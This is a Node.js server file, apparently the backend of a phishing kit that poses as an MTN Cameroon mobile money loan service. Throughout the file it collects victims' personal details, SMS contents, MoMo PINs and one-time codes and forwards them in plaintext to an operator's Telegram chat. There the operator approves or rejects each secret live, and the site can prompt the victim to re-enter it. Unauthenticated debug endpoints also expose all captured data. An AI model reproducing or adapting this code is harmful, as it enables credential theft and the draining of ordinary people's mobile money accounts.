// ============================================================
// server.js – MTN Cameroon with Twilio SMS Forwarding
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const twilio = require('twilio');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};
const rejectionHistory = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Twilio Configuration
const TWILIO_ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID;
const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN;
const TWILIO_PHONE_NUMBER = process.env.TWILIO_PHONE_NUMBER;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    console.log('Please set these in your .env file or Render environment variables');
}

if (!TWILIO_ACCOUNT_SID || !TWILIO_AUTH_TOKEN || !TWILIO_PHONE_NUMBER) {
    console.warn('⚠️ Twilio credentials missing. SMS sending will be disabled.');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
console.log('✅ Server starting...');

// ─── Data Persistence Setup ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

// ─── Save/Load Functions ───
function saveApplications() {
    try {
        const data = {
            applications: applications,
            rejectionHistory: rejectionHistory,
            timestamp: new Date().toISOString()
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('💾 Applications saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving applications:', error);
        return false;
    }
}

function loadApplications() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 7 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
                return true;
            } else {
                console.log('📂 Data file is older than 7 days, starting fresh');
                const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
                fs.copyFileSync(DATA_FILE, backupFile);
                console.log(`📂 Backed up old data to ${backupFile}`);
                return false;
            }
        }
    } catch (error) {
        console.error('❌ Error loading applications:', error);
    }
    return false;
}

function saveRejectionHistory() {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(rejectionHistory, null, 2));
        console.log('💾 Rejection history saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving rejection history:', error);
        return false;
    }
}

function loadRejectionHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            const parsed = JSON.parse(data);
            Object.assign(rejectionHistory, parsed);
            console.log(`📂 Loaded rejection history from disk`);
            return true;
        }
    } catch (error) {
        console.error('❌ Error loading rejection history:', error);
    }
    return false;
}

// ─── Auto-save every 30 seconds ───
setInterval(() => {
    if (Object.keys(applications).length > 0) {
        saveApplications();
        if (Object.keys(rejectionHistory).length > 0) {
            saveRejectionHistory();
        }
    }
}, 30000);

// ─── Save on shutdown ───
function gracefulShutdown() {
    console.log('🔄 Saving data before shutdown...');
    saveApplications();
    saveRejectionHistory();
    process.exit(0);
}

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);

// ─── Load data on startup ───
loadApplications();
loadRejectionHistory();

// ─── Telegram Message Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
        return { ok: false, error: 'Bot token missing' };
    }
    
    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    
    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return { ok: false, error: error.message };
    }
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SMS SENDING FUNCTION (TWILIO) ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

async function sendSms(toNumber, message) {
    // Check if Twilio is configured
    if (!TWILIO_ACCOUNT_SID || !TWILIO_AUTH_TOKEN || !TWILIO_PHONE_NUMBER) {
        console.log('📱 SMS would be sent to:', toNumber);
        console.log('📋 Message:', message);
        console.log('⚠️ Twilio not configured - SMS not actually sent.');
        return { ok: true, simulated: true };
    }
    
    try {
        const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
        
        const result = await client.messages.create({
            body: message,
            from: TWILIO_PHONE_NUMBER,
            to: toNumber
        });
        
        console.log(`📱 SMS sent to ${toNumber}: ${result.sid}`);
        return { ok: true, sid: result.sid };
    } catch (error) {
        console.error('❌ Twilio SMS error:', error);
        return { ok: false, error: error.message };
    }
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 1. Application Submission ───
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

        const isResubmission = !!applications[applicationId];
        
        applications[applicationId] = { 
            ...data, 
            smsStatus: 'pending', 
            pinStatus: 'pending', 
            otpStatus: 'pending',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            resubmissionCount: isResubmission ? (applications[applicationId]?.resubmissionCount || 0) + 1 : 0,
            createdAt: isResubmission ? applications[applicationId]?.createdAt : new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        
        saveApplications();
        
        console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);

        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
        
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, applicationId, status: 'waiting_sms' });
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 2. SMS Submission ───
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { momoData } = req.body;
        const { applicationId, phone, momoMessage, isResubmission } = momoData;

        applications[applicationId].smsMessage = momoMessage;
        applications[applicationId].smsStatus = 'pending';
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-momo-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 3. PIN Submission ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin, isResubmission } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({ 
                ok: false, 
                error: `Too many failed attempts. Please wait ${remaining} seconds.`,
                blocked: true,
                remainingSeconds: remaining
            });
        }
        
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
            app.pinAttempts = 0;
            app.pinBlockedUntil = null;
        }
        
        app.pin = pin;
        app.pinStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔐 *PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 4. PIN Rejected Handler ───
app.post('/api/pin-rejected', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        const remainingAttempts = app.maxPinAttempts - app.pinAttempts;
        
        if (remainingAttempts <= 0) {
            app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
            app.pinStatus = 'blocked';
            saveApplications();
            
            await sendTelegramMessage(
                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
            );
            
            return res.json({
                ok: false,
                blocked: true,
                remainingAttempts: 0,
                message: 'Too many failed attempts. Please wait 5 minutes.'
            });
        }
        
        saveApplications();
        
        return res.json({
            ok: true,
            remainingAttempts: remainingAttempts,
            message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.`
        });
        
    } catch (error) {
        console.error('Error in /api/pin-rejected:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 5. Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.pinAttempts = 0;
        app.pinBlockedUntil = null;
        app.pinStatus = 'pending';
        saveApplications();
        
        res.json({ ok: true });
    } catch (error) {
        console.error('Error resetting PIN attempts:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 6. Get PIN Status ───
app.get('/api/pin-status/:applicationId', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
        const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
        let blockRemaining = 0;
        
        if (isBlocked) {
            blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
        }
        
        res.json({
            ok: true,
            pinAttempts: app.pinAttempts || 0,
            remainingAttempts: Math.max(0, remainingAttempts),
            maxAttempts: app.maxPinAttempts,
            isBlocked: isBlocked,
            blockRemainingSeconds: blockRemaining,
            pinStatus: app.pinStatus
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 7. OTP Submission ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp, isResubmission } = req.body;
        applications[applicationId].otp = otp;
        applications[applicationId].otpStatus = 'pending';
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `🔑 *OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];

        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, status: 'waiting_admin' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 8. Resend OTP ───
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();
        
        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;
        
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
        ]];
        
        await sendTelegramMessage(message, buttons);
        
        res.json({ ok: true, status: 'otp_resent' });
    } catch (error) {
        console.error('Error in /api/resend-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 9. Final Completion ───
app.post('/api/send-final-details', async (req, res) => {
    try {
        const data = req.body.finalData;
        applications[data.applicationId].pinStatus = 'approved';
        applications[data.applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `✅ *LOAN COMPLETE (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

        await sendTelegramMessage(message);
        res.json({ ok: true, status: 'dashboard_ready' });
    } catch (error) {
        console.error('Error in /api/send-final-details:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 10. Get Rejection Redirect Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) {
            return res.status(404).json({ ok: false, error: 'Application not found' });
        }
        
        let rejectedStep = null;
        let errorMessage = '';
        
        if (app.smsStatus === 'rejected') {
            rejectedStep = 'sms';
            errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.';
        } else if (app.pinStatus === 'rejected') {
            rejectedStep = 'pin';
            errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.';
        } else if (app.otpStatus === 'rejected') {
            rejectedStep = 'otp';
            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
        }
        
        res.json({
            ok: true,
            rejectedStep,
            errorMessage,
            applicationId: req.params.applicationId
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 11. Webhook (With SMS Forwarding on YES) ───
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('📩 Webhook received');
    
    try {
        // ─── HANDLE ADMIN COMMANDS ───
        if (req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id;
            const username = req.body.message.from?.username || 'Unknown';
            
            console.log(`💬 Command from ${username}: ${text}`);
            
            if (chatId.toString() === TELEGRAM_CHAT_ID) {
                
                if (text === '/stats') {
                    const total = Object.keys(applications).length;
                    const pendingSms = Object.values(applications).filter(a => a.smsStatus === 'pending').length;
                    const pendingPin = Object.values(applications).filter(a => a.pinStatus === 'pending').length;
                    const pendingOtp = Object.values(applications).filter(a => a.otpStatus === 'pending').length;
                    const approved = Object.values(applications).filter(a => a.otpStatus === 'approved').length;
                    const rejected = Object.values(applications).filter(a => 
                        a.smsStatus === 'rejected' || 
                        a.pinStatus === 'rejected' || 
                        a.otpStatus === 'rejected'
                    ).length;
                    
                    const recentIds = Object.keys(applications).slice(-5);
                    let recentList = recentIds.length > 0 ? 
                        recentIds.map(id => {
                            const app = applications[id];
                            return `🆔 ${id} - ${app.firstName} ${app.lastName} (${app.smsStatus})`;
                        }).join('\n') : 
                        'No applications yet';
                    
                    await sendTelegramMessage(
                        `📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`
                    );
                    return res.sendStatus(200);
                }
                
                if (text === '/list') {
                    const ids = Object.keys(applications);
                    if (ids.length === 0) {
                        await sendTelegramMessage('📭 No applications found.');
                        return res.sendStatus(200);
                    }
                    
                    const displayIds = ids.slice(-10);
                    let message = '📋 *APPLICATION LIST* 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
                    displayIds.forEach((id, i) => {
                        const app = applications[id];
                        message += `\n${i+1}. 🆔 *${id}*\n`;
                        message += `   👤 ${app.firstName} ${app.lastName}\n`;
                        message += `   📱 +237${app.phone}\n`;
                        message += `   💰 XAF ${app.loanAmount.toLocaleString()}\n`;
                        message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                    });
                    
                    if (ids.length > 10) {
                        message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
                    }
                    
                    await sendTelegramMessage(message);
                    return res.sendStatus(200);
                }
                
                if (text.startsWith('/search ')) {
                    const searchId = text.replace('/search ', '').trim().toUpperCase();
                    const app = applications[searchId];
                    
                    if (!app) {
                        await sendTelegramMessage(`❌ Application *${searchId}* not found.`);
                        return res.sendStatus(200);
                    }
                    
                    await sendTelegramMessage(
                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n📧 Email: ${app.email}\n💰 Amount: XAF ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: XAF ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+237${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
                    );
                    return res.sendStatus(200);
                }
                
                if (text.startsWith('/delete ')) {
                    const deleteId = text.replace('/delete ', '').trim().toUpperCase();
                    if (applications[deleteId]) {
                        const appName = applications[deleteId].firstName + ' ' + applications[deleteId].lastName;
                        delete applications[deleteId];
                        saveApplications();
                        await sendTelegramMessage(`✅ Application *${deleteId}* (${appName}) deleted successfully.`);
                    } else {
                        await sendTelegramMessage(`❌ Application *${deleteId}* not found.`);
                    }
                    return res.sendStatus(200);
                }
                
                if (text === '/clear') {
                    const count = Object.keys(applications).length;
                    if (count === 0) {
                        await sendTelegramMessage('📭 No applications to clear.');
                        return res.sendStatus(200);
                    }
                    Object.keys(applications).forEach(key => delete applications[key]);
                    Object.keys(rejectionHistory).forEach(key => delete rejectionHistory[key]);
                    saveApplications();
                    saveRejectionHistory();
                    await sendTelegramMessage(`✅ Cleared all ${count} applications.`);
                    return res.sendStatus(200);
                }
                
                if (text === '/status') {
                    const appCount = Object.keys(applications).length;
                    const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
                    await sendTelegramMessage(
                        `✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${webhookInfo.result?.url || 'Not set'}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}`
                    );
                    return res.sendStatus(200);
                }
                
                if (text === '/help' || text === '/start') {
                    await sendTelegramMessage(
                        `🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (warning!)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`
                    );
                    return res.sendStatus(200);
                }
                
                if (text.startsWith('/')) {
                    await sendTelegramMessage(`❌ Unknown command. Type /help to see available commands.`);
                    return res.sendStatus(200);
                }
            } else {
                console.log(`⚠️ Unauthorized message from ${username} (${chatId})`);
                await sendTelegramMessage(`⚠️ You are not authorized to use this bot.`);
                return res.sendStatus(200);
            }
        }
        
        // ─── HANDLE CALLBACK QUERIES (Button Clicks) ───
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            console.log('🔘 Callback query:', query.data);
            
            try {
                const { action, step, applicationId } = JSON.parse(query.data);
                const app = applications[applicationId];
                
                if (!app) {
                    console.log(`❌ Application ${applicationId} not found`);
                    return res.sendStatus(200);
                }
                
                if (action === 'NO') {
                    rejectionHistory[applicationId] = {
                        step: step,
                        timestamp: new Date().toISOString(),
                        previousStatus: app[step.toLowerCase() + 'Status']
                    };
                    saveRejectionHistory();
                    console.log(`❌ Rejected ${step} for ${applicationId}`);
                }
                
                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);
                
                const statusKey = step.toLowerCase() + 'Status';
                
                // ─── SMS APPROVAL WITH FORWARDING ───
                if (step === 'SMS' && app.smsStatus === 'pending') {
                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`📨 SMS status: ${app.smsStatus}`);
                    
                    // ─── FORWARD SMS ON APPROVAL ───
                    if (action === 'YES' && app.smsMessage) {
                        const userPhone = '+237' + app.phone;
                        const smsContent = app.smsMessage;
                        
                        console.log(`📤 Forwarding SMS to ${userPhone}`);
                        
                        const smsResult = await sendSms(userPhone, smsContent);
                        
                        if (smsResult.ok) {
                            await sendTelegramMessage(
                                `✅ *SMS FORWARDED*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 To: ${userPhone}\n📋 Message: ${smsContent}`
                            );
                        } else {
                            await sendTelegramMessage(
                                `❌ *SMS FAILED*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 To: ${userPhone}\n❌ Error: ${smsResult.error}`
                            );
                        }
                    }
                }
                
                // ─── PIN APPROVAL ───
                else if (step === 'PIN' && app.pinStatus === 'pending') {
                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔐 PIN status: ${app.pinStatus}`);
                }
                
                // ─── OTP APPROVAL ───
                else if (step === 'OTP' && app.otpStatus === 'pending') {
                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
                    console.log(`🔑 OTP status: ${app.otpStatus}`);
                }
                
                app.updatedAt = new Date().toISOString();
                saveApplications();
                
                // Answer callback
                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: query.id,
                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
                        show_alert: false
                    })
                });
                
                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
                await sendTelegramMessage(`📌 *Status Update (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
                
            } catch (parseError) {
                console.error('❌ Error parsing callback data:', parseError);
            }
            
            return res.sendStatus(200);
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(500);
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 12. Status Check ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
        
        let status = 'pending';
        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') status = app.pinStatus;
        else if (req.params.step === 'otp') status = app.otpStatus;
        
        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;
        
        res.json({ 
            ok: true, 
            status,
            rejectionInfo,
            resubmissionCount: app.resubmissionCount || 0
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 13. Debug Endpoints ───
app.get('/api/debug/applications', (req, res) => {
    res.json({
        total: Object.keys(applications).length,
        applications: applications,
        rejections: rejectionHistory,
        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
    });
});

app.get('/api/debug/application/:id', (req, res) => {
    const app = applications[req.params.id];
    if (!app) return res.status(404).json({ error: 'Application not found' });
    res.json(app);
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── 14. Backup Endpoint ───
app.get('/api/debug/backup', (req, res) => {
    try {
        const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
        const data = {
            applications: applications,
            rejectionHistory: rejectionHistory,
            timestamp: new Date().toISOString()
        };
        fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
        res.json({ 
            ok: true, 
            message: 'Backup created',
            file: backupFile
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── Serve Frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`💾 Data directory: ${DATA_DIR}`);
    console.log(`🔗 Visit: http://localhost:${PORT}`);
});
